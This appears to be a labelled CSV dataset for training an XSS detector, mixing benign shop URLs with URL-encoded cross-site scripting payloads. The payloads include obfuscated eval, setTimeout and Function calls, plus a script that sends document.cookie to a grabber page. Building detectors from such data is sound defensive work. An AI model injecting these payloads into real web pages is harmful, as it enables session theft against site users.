text,label
/api/items?id=740&details=true&color=white,0
/cart?electronics=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/login?banana=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?total=969&currency=USD,0
/order?item=tablet&quantity=48,0
/api/items?id=595&details=true,0
/cart?electronics=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?total=466&currency=USD&color=blue,0
/products?electronics=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/order?item=chair&quantity=31,0
/search?electronics=%3Csvg%20onload%3Dalert%281%29%3E,1
/checkout?total=272&currency=USD,0
/search?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/api/items?id=301&details=true,0
/products?category=electronics&page=1&color=black&size=large,0
/cart?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?username1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/user/profile?id=1406&view=summary&color=yellow,0
/search?laptop=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=759&details=true&color=red,0
/products?category=clothing&page=9,0
/cart?action=add&item=pen&size=small,0
/products?category=groceries&page=10,0
/cart?username1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?q=book,0
/search?electronics=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/products?category=clothing&page=1,0
/search?q=groceries,0
/search?apple=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?item=chair&action=add,0
/login?electronics=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/login?password123=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?item=shirt&quantity=75&category=electronics,0
/cart?shoes=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/user/profile?id=1331&view=summary&size=large,0
/search?q=electronics&color=red,0
/api?category1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=2460&view=summary&color=blue,0
/wishlist?phone=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/search?electronics=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=view&item=tablet&color=red,0
/api/items?id=532&details=true,0
/order?search_term=%3Csvg%20onload%3Dalert%281%29%3E,1
/api?banana=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/api/items?id=590&details=true&color=black,0
/wishlist?phone=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api?phone=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/login?laptop=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?q=book,0
/cart?shoes=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?book=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?shoes=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/checkout?total=387&currency=USD&color=green,0
/wishlist?password123=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?item=tablet&quantity=8,0
/api/items?id=237&details=true,0
/cart?action=update&item=notebook&color=yellow,0
/search?username1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?q=pen&color=green,0
/search?q=bottle&color=yellow,0
/search?q=phone&color=black,0
/checkout?total=792&currency=USD,0
/cart?password123=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?item=bottle&action=remove,0
/order?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?category1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/api/items?id=372&details=true,0
/checkout?book=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?search_term=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?category1=%3Csvg%20onload%3Dalert%281%29%3E,1
/api/items?id=693&details=true,0
/wishlist?item=notebook&action=remove&color=black&size=large,0
/search?q=pen&size=large,0
